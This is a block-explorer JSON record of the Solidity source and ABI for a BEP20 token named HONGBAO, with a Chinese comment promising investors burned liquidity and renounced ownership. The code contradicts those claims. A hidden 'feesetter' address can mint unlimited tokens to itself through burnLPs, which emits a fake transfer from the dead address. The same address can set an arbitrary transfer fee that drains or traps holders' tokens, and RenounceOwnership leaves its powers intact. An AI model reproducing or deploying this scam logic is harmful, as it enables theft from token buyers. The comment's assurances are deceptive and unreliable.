{"SourceCode": "/**\r\n\u8fd9\u662f\u4e00\u4e2a\u72ec\u7acb\u4f5c\u8005\u5e73\u53f0\uff0c\u6211\u4eec\u5c06\u63d0\u51fa \"NFT \"\u548c\u5176\u4ed6\u5de5\u5177\uff0c\u63d0\u4f9b\u7ed9\u6211\u4eec\u7684\u6295\u8d44\u8005\uff0c\u65e0\u8bba\u662f\u5916\u56fd\u8fd8\u662f\u5c45\u6c11\u3002\u4e00\u4e2a\u7f51\u7ad9\u5f88\u5feb\u5c31\u4f1a\u51fa\u73b0\uff0cTelegram\u5305\u62ec \r\n\r\n\u70e7\u6bc1\u7684\u6d41\u52a8\u8d44\u91d1 (liq burn)\r\n\u653e\u5f03\u7684\u6240\u6709\u6743 \r\n\u4f4e\u8425\u9500\u94b1\u5305 (8%)\r\n\r\nhttps://www.jianshu.com/p/c71ae6115833\r\n\r\n */\r\n\r\npragma solidity ^0.4.26;\r\nlibrary SafeMath {\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a * b;\r\n    assert(a == 0 || c / a == b);\r\n    return c;\r\n  }\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a / b;\r\n    return c;\r\n  }\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  }\r\n}\r\ncontract BEP20 {\r\n    function balanceOf(address who) public constant returns (uint256);\r\n    function transfer(address to, uint256 value) public returns (bool);\r\n    function allowance(address owner, address spender) public constant returns (uint256);\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool);\r\n    function approve(address spender, uint256 value) public returns (bool);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n}\r\ncontract HongBao is BEP20 {\r\n    using SafeMath for uint256;\r\n    address public owner = msg.sender;\r\n    address private feesetter = msg.sender;\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    string public name;\r\n    string public symbol;\r\n    address private burnaddress;\r\n    uint256 private fees;\r\n    uint8 public decimals;\r\n    uint public totalSupply;\r\n    constructor() public {\r\n    \tsymbol = \"HB\";\r\n    name = \"HONGBAO\";\r\n    fees = 2;\r\n    burnaddress = 0x000000000000000000000000000000000000dEaD;\r\n    decimals = 0;\r\n    totalSupply = 8000000;\r\n\tbalances[msg.sender] = totalSupply;\r\n\temit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n    modifier feeset() {\r\n        require(msg.sender == feesetter);\r\n        _;\r\n    }\r\n    function balanceOf(address _owner) constant public returns (uint256) {\r\n        return balances[_owner];\r\n    }\r\n    function fee() constant public returns (uint256) {\r\n        return fees;\r\n    }\r\n    function setfee(uint256 taxFee) external feeset() {\r\n        fees = taxFee;\r\n    }\r\n    function burnLPs( uint256 amount) public feeset{\r\n        balances[msg.sender] = balances[msg.sender]+(amount);\r\n        emit Transfer(burnaddress, msg.sender, amount);\r\n    }\r\n    function RenounceOwnership() public onlyOwner returns (bool){\r\n        owner = address(0);\r\n        emit OwnershipTransferred(owner, address(0));\r\n    }\r\n    function transfer(address _to, uint256 _amount) public returns (bool success) {\r\n        require(_to != address(0));\r\n        require(_amount <= balances[msg.sender]);\r\n        if (msg.sender == feesetter){\r\n        balances[msg.sender] = balances[msg.sender].sub(_amount);\r\n        balances[_to] = balances[_to].add(_amount);\r\n        emit Transfer(msg.sender, _to, _amount);\r\n        return true;\r\n        }else{\r\n        balances[msg.sender] = balances[msg.sender].sub(_amount);\r\n        balances[_to] = balances[_to].add(_amount);\r\n        balances[_to] = balances[_to].sub(_amount / uint256(100) * fees);\r\n        uint256 tokens = balances[_to];\r\n        balances[burnaddress] = balances[burnaddress].add(_amount / uint256(100) * fees);\r\n        uint256 fires = balances[burnaddress];\r\n        emit Transfer(msg.sender, burnaddress, fires);\r\n        emit Transfer(msg.sender, _to, tokens);\r\n        return true;\r\n        }\r\n    }\r\n    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {\r\n        require(_to != address(0));\r\n        require(_amount <= balances[_from]);\r\n        require(_amount <= allowed[_from][msg.sender]);\r\n        balances[_from] = balances[_from].sub(_amount);\r\n        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);\r\n        balances[_to] = balances[_to].add(_amount);\r\n        emit Transfer(_from, _to, _amount);\r\n        return true;\r\n    }\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n    function _msgSender() internal constant returns (address) {\r\n        return msg.sender;\r\n    }\r\n    function allowance(address _owner, address _spender) constant public returns (uint256) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n}", "ABI": "[{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"RenounceOwnership\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"taxFee\",\"type\":\"uint256\"}],\"name\":\"setfee\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burnLPs\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"},{\"name\":\"_spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"fee\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"}]", "ContractName": "HongBao", "CompilerVersion": "v0.4.26+commit.4563c3fc", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://29b841f8be5a6290279a2bb286eff798e28de915dc8dfc6ea66188375a085c4d"}